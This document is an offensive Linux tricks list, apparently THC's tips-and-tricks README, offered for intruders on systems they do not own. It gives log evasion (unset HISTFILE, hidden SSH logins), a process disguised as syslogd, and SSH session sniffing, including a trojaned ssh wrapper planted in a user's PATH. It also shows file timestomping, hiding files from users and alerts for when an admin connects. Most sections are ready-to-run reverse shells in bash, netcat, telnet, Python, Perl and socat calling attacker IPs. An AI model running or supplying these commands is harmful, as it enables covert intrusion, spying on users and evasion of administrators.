# thc-1001-tips-and-tricks
Various tips &amp; tricks

A collection of our favorite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Send them to root@thc.org.


**1. Leave Bash without history:**

Tell Bash that there is no history file (*~/.bash_history*).
```
$ unset HISTFILE
```
This is the first command we execute on every shell. It will stop the Bash from logging your commands.

It is good housekeeping to 'commit suicide' when exiting the shell:
```
$ kill -9 $$
```

**2. Almost invisible SSH**

```
$ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
```
This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.

**3. SSH tunnel OUT**

We use this all the time to circumvent local firewalls or IP filtering:
```
$ ssh -g -L31337:1.2.3.4:80 user@host.org
```
You or anyone else can now connect to your computer on port 31337 and gets connected to 1.2.3.4:80 and appearing from host 'host.org'

**4. SSH tunnel IN**

We use this to give access to a friend to an internal machine that is not on the public Internet:
```
$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
```
Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.

**5. Hide your command**

```
$ cp `which nmap` syslogd
$ PATH=.:$PATH syslogd -T0 10.0.2.1/24
```
In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.

**6. Hide your arguments**

Continuing from above..FIXME: can this be done witout LD_PRELOAD and just in Bash?

**7. ARP discover computers on the local network**
```
$ nmap -r -sn -PR 192.168.0.1/24
```
This will Arp-ping all local machines. ARP ping always seems to work and is very steahlthy (e.g. does not show up in the target's firewall). However, this command is by far our favourite:
```
$ nmap -thc
```

**8. Sniff a SSH session**
```
$ strace -p <PID of ssh> -e trace=read -o ~/.ssh/ssh_log.txt
$ grep 'read(4' ~/.ssh/ssh_log.txt | cut -f1 -d\"
```
Dirty way to monitor a user who is using ssh to connect to another host from a computer that you control.

**9. Sniff a SSH session without root priviledges**

Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
```
# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile

# Create our log directory and our own ssh binary
$ mkdir ~/.ssh/.logs
$ mkdir -p ~/.local/bin ~/.ssh/logs

$ cat >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
# now press CTRL-d to close the file.

$ cat ~/.local/bin/ssh-log
#! /bin/bash
grep 'read(4' | cut -f2 -d\" | while read -r x; do
        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
                echo ""
        else
                echo -n "${x}"
        fi
done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
# now press CTRL-d to close the file

$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
```

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.

**10. File Encoding - uuencode**

Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).

Encode:
```
$ uuencode /etc/issue.net issuer.net-COPY
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```
Cut & paste the output (4 lines, starting with 'being 644 ...') into this command:
Decode:
```
$ uudecode
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

**11. File Encoding - openssl**

Openssl can be used when uu/decode/encode is not available on the remote system:

Encode:
```
$ openssl base64 </etc/issue.net
VWJ1bnR1IDE4LjA0LjIgTFRTCg==
```
Cut & paste the output into this command:
```
$ openssl base64 -d >issue.net-COPY
```

**12. File Encoding - xxd**

..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.

Encode:
```
$ xxd -p </etc/issue.net
726f6f743a783a303a30...
```

Cut & paste the output into this command:
Decode:
```
$ xxd -p -r >issue.net-COPY
```

**13. File transfer - using *screen* from REMOTE to LOCAL**

Transfer a file FROM the remote system to your local system:

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```
$ openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer and from a different shell decode the file:
```
$ openssl base64 -d <screen-xfer.txt
$ rm -rf screen-xfer.txt
```

**13. File transfer - using *screen* from LOCAL to REMOTE**

On your local system (from within a different shell) encode the data:
```
$ openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```
$ openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

**14. Shred & Erase a file**

```
$ shred -z foobar.txt
```

**15. Shred & Erase without *shred***
```
$ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

**16. Hide files as User from that User**

```
alias ls='ls -I SecretDirectory'
```

This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.

**17. Restore the date of a file**

Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)

```
$ touch -r /etc/shadow /etc/passwd
```

**18. Monitor all new TCP connections**

```
# tcpdump -n "tcp[tcpflags] == tcp-syn"
```

**19. Alert on new TCP connections**

Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from our system (could be an admin!).

```
# tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
```

**20. Generate quick random Password**

Good for quick passwords without human element.

```
$ openssl rand -base64 24
```

**21. Get a root shell in Docker container.**

If the container is already running:

```
$ docker exec -it --user root <container-name> /bin/bash
```

If the container is not running:

```
$ docker run -it --user root --entrypoint /bin/bash <container>
```

**22. Linux transportable encrypted filesystems.**

Like truecrypt but better.  You may need to `losetup -f` to get a loop device.

Make a junk file, here 256MB is used, encrypt, and partition. You will be prompted for a password.

```
$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
$ cryptsetup luksFormat /tmp/crypted
$ mkfs.ext3 /tmp/crypted
```

Mount:

```
# losetup /dev/loop0 /tmp/crypted
# cryptsetup open /dev/loop0 crypted
# mount -t ext3 /dev/mapper/crypted /mnt/crypted
```

Store data in `/mnt/crypted`, then unmount:

```
# umount /mnt/crypted
# cryptsetup close crypted
# losetup -d /dev/loop0
```

**23. Reverse Shell with Bash**

Start netcat to listen on port 1524 on your system:
```
$ nc -nvlp 1524
```

On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
```
$ bash -i 2>&1 >& /dev/tcp/3.13.3.7/1524 0>&1
```

**24. Reverse Shell without Bash**

Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:

On the remote system:
```
$ mkfifo /tmp/.io
$ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

Telnet variant:
```
$ mkfifo /tmp/.io
$ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

**24. Reverse shell with Python**
```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.55",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**25. Reverse shell with Perl**

```
# method 1
$ perl -e 'use Socket;$i="10.11.0.55";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# method 2
$ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.11.0.55:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```

**26. Upgrade a dumb shell to a pty shell**

```
# python
python -c 'import pty; pty.spawn("/bin/bash")'
# perl
perl -e 'exec "/bin/bash";'
# awk
awk 'BEGIN {system("/bin/bash")}'
```

**27. Upgrade a dumb shell to a fully interactive shell with Python and stty**

```
# on target host
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# on attacker's host
$ stty raw -echo
$ fg
$ reset
# on target host
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 43 columns 132
```

**28. Spawn a fully interactive reverse shell with socat**

```
# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.11.0.55:4444
```

--------------------------------------------------------------------------
Shoutz: ADM
